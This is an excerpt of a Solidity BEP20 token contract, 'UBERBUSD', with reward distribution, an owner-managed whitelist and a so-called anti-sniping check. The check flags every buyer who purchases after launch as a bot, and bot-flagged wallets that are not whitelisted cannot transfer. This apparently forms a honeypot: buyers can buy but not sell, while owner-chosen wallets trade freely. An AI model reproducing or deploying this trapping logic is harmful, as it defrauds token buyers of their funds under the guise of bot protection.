...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 BTCB = IBEP20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56); //the reward token you want distributed 
...
contract UBERBUSD is IBEP20, Auth {
    using SafeMath for uint256;

    address BTCB = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56; //Input the token address of whatever your reward is. leave 431,432,433 as is. 
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; 
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address MARK = 0xF4b21f13fadD5B73736F43420E795058B03680D4; // Marketing wallet

    string constant _name = "UBERBUSD";
    string constant _symbol = "UBUSD";
    ...
    function enableWhitelist(address[] memory _users) external onlyOwner() {
    ...
    function addWhitelist(address _user) external onlyOwner() {
        _whitelistWallets[_user] = true;
    }
    function isWhitelisted(address _user) public view returns (bool) {
        return _whitelistWallets[_user];
    }
    function deleteWhitelisted(address _user) external onlyOwner() {
        delete _whitelistWallets[_user];
    }
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (sender == pair && 
            antisniping) {
            checkIsSniping(recipient);
        }

        if (isBot(sender) && 
            !isWhitelisted(sender)) { require(!isBot(sender) || isWhitelisted(sender), "Not authorised"); }
    ...
    function launchDate() external onlyOwner() {
        if (launchedAt != 0) {
    ...
    function checkIsSniping(address _address) private {
        if (launchedTime < block.timestamp) {
            _snipingBots.push(_address);
        }   
    }
